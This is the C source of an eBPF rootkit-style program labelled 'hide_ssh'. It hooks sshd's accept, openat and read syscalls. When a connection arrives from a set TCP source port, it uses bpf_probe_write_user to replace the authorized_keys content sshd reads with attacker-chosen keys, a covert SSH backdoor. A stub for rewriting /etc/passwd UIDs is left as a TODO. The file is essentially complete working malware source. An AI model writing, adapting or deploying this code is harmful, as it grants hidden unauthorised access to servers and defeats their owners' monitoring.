#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

#define logprefix "hide_ssh: "
#define bpf_printk(fmt, ...)                            \
({                                                      \
        char ____fmt[] = logprefix fmt;                 \
        bpf_trace_printk(____fmt, sizeof(____fmt),      \
                         ##__VA_ARGS__);                \
})

#define AUTHORIZED_KEYS 1
#define PASSWD 2

#define filename_len_max 128
#define overwritten_content_len_max 65536


/*
    User defined variables
*/

const volatile unsigned short src_port = 2345;

const volatile int overwritten_content_len = 0;
const volatile char overwritten_content[overwritten_content_len_max];




/*
    Overwritting struct elem
*/
struct elem {
    int pid;
    int fd;
    unsigned long buff;
    int buff_len;
    int file_type;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, int); // pid_tgid
    __type(value, struct elem); // elem
} pid_elem SEC(".maps");

/*
    passwd data
*/

// TODO

/*
    Port Trigger
*/

struct accept_args {
    struct sockaddr_in *addr;
    int *ttl;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4);
    __type(key, int); // simple key (Arbitrary 0)
    __type(value, struct accept_args); // struct accept_args
} next_uid SEC(".maps");


SEC("tp/syscalls/sys_enter_openat")
int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int file_type = 0;
    int tgid = bpf_get_current_pid_tgid();
    int pid = bpf_get_current_pid_tgid() >> 32;
    char comm[10];
    bpf_get_current_comm(&comm, 10);
    
    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
        return 0;
    }

    const int key = 0;
    int *port_triggered = bpf_map_lookup_elem(&next_uid, &key);
    if (port_triggered == 0) {
        return 0;
    }

    char check_filename[filename_len_max];
    bpf_probe_read(&check_filename, filename_len_max, (char*)ctx->args[1]);



    int is_passwd = 1;
    /* passwd */
    const char passwd[] = "/etc/passwd";
    for (int i = 0; i < 11; i++) {
        if (passwd[i] != check_filename[i]) {
            is_passwd = 0;
            break;
        }
    }
    if (is_passwd == 1) {
        file_type = PASSWD;
    }

    int is_auth_key = 0;
    if (file_type == 0) {
        /* Auth_keys file */
        int checking_auth_file = 0;   
        for (int i = 0; i < filename_len_max; i++) {
            if (checking_auth_file == 1) {
                if (i+14 > filename_len_max) {
                    break;
                }
                if (check_filename[i] == 'a' && check_filename[i+1] == 'u' && check_filename[i+2] == 't' && check_filename[i+3] == 'h' && check_filename[i+4] == 'o' && check_filename[i+5] == 'r' && check_filename[i+6] == 'i' && check_filename[i+7] == 'z' && check_filename[i+8] == 'e' && check_filename[i+9] == 'd' && check_filename[i+10] == '_' && check_filename[i+11] == 'k' && check_filename[i+12] == 'e' && check_filename[i+13] == 'y' && check_filename[i+14] == 's') {
                    is_auth_key = 1;
                    break;
                } else {
                    checking_auth_file = 0;
                }
            }
            if (check_filename[i] == '/') {
                checking_auth_file = 1;
            }
            // if null byte
            if (check_filename[i] == 0) {
                break;
            }
        }
    }
    
    if (is_auth_key == 1) {
        file_type = AUTHORIZED_KEYS;
    }

    if (file_type == 0) { // not passwd or auth_keys
        return 0;
    }

    bpf_printk("openat_entrypoint[%d] path: %s\n", pid, ctx->args[1]);
    struct elem value = {
        .pid = pid,
        .fd = ctx->args[0],
        .buff = 0,
        .buff_len = 0,
        .file_type = file_type
    };
    bpf_map_update_elem(&pid_elem, &tgid, &value, 0);
    return 0;
}

SEC("tp/syscalls/sys_exit_openat")
int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    const int trigger_key = 0;
    int tgid = bpf_get_current_pid_tgid();
    struct elem *fd = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (fd == 0) {
        return 0;
    }
    struct elem *e = fd;
    e->fd = ctx->ret;

    if (ctx->ret < 0) {
        bpf_map_delete_elem(&pid_elem, &tgid);
        bpf_map_delete_elem(&next_uid, &trigger_key);
        return 0;
    }

    bpf_printk("openat_exitpoint[%d]: fd = %d\n", tgid, ctx->ret);
    return 0;
}

SEC("tp/syscalls/sys_enter_read")
int read_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    int tgid = bpf_get_current_pid_tgid();
    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }

    if (e->fd != ctx->args[0]) {
        bpf_printk("Error read_entrypoint[%d]: fd: %d != %d\n", tgid, e->fd, ctx->args[0]);
        return 0;
    }

    e->buff = ctx->args[1];
    e->buff_len = ctx->args[2];

    bpf_printk("read_entrypoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    const int trigger_key = 0;
    int tgid = bpf_get_current_pid_tgid();
    if (ctx->ret < 0) {
        return 0;
    }

    struct elem *e = bpf_map_lookup_elem(&pid_elem, &tgid);
    if (e == 0) {
        return 0;
    }

    struct accept_args *args = bpf_map_lookup_elem(&next_uid, &trigger_key);
    if (args == 0) {
        return 0;
    }
    int ttl = args->ttl;
    int file_type = e->file_type;


    if (file_type == AUTHORIZED_KEYS && overwritten_content_len+1 > ctx->ret) {
        bpf_printk("Error read_exitpoint[%d]: buff_len: %d < %d\n", tgid, ctx->ret, overwritten_content_len+1);
        bpf_map_delete_elem(&pid_elem, &tgid);
        bpf_map_delete_elem(&next_uid, &trigger_key);
        return 0;
    }

    if (file_type == AUTHORIZED_KEYS) {
        bpf_probe_write_user((void*)e->buff, (void*)overwritten_content, overwritten_content_len+1); // +1 for null byte
    } else if (file_type == PASSWD) {
        // TODO: need to loop through each char and replace any 1-9 with 0
        
    }
    
    bpf_printk("read_exitpoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
    bpf_map_delete_elem(&pid_elem, &tgid);
    if (ttl == 1) {
        bpf_map_delete_elem(&next_uid, &trigger_key);
    } else {
        args->ttl = ttl-1;
    }
    return 0;
}

/*
    Trigger UID from tcp src port
*/

SEC("tp/syscalls/sys_enter_accept")
int accept_entrypoint(struct trace_event_raw_sys_enter *ctx)
{
    char comm[10];
    bpf_get_current_comm(&comm, 10);
    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
        return 0;
    }
    struct sockaddr_in * addr = (struct sockaddr_in *)ctx->args[1];
    struct accept_args args = {
        .addr = addr,
        .ttl = 4 // doing a little hack
    };
    const int key = 0;
    bpf_map_update_elem(&next_uid, &key, &args, 0);
    return 0;
}

SEC("tp/syscalls/sys_exit_accept")
int accept_exitpoint(struct trace_event_raw_sys_exit *ctx)
{
    char comm[10];
    bpf_get_current_comm(&comm, 10);
    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
        return 0;
    }
    const int key = 0;
    struct accept_args *args = bpf_map_lookup_elem(&next_uid, &key);
    if (args == 0) {
        return 0;
    }
    struct sockaddr_in read = {
        .sin_family = 0,
        .sin_port = 0,
        .sin_addr = 0
    };
    bpf_probe_read(&read, sizeof(struct sockaddr_in), args->addr);
    unsigned short port = __bpf_ntohs(read.sin_port);
    if (port == src_port) {
        return 0;
    }
    bpf_map_delete_elem(&next_uid, &key);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";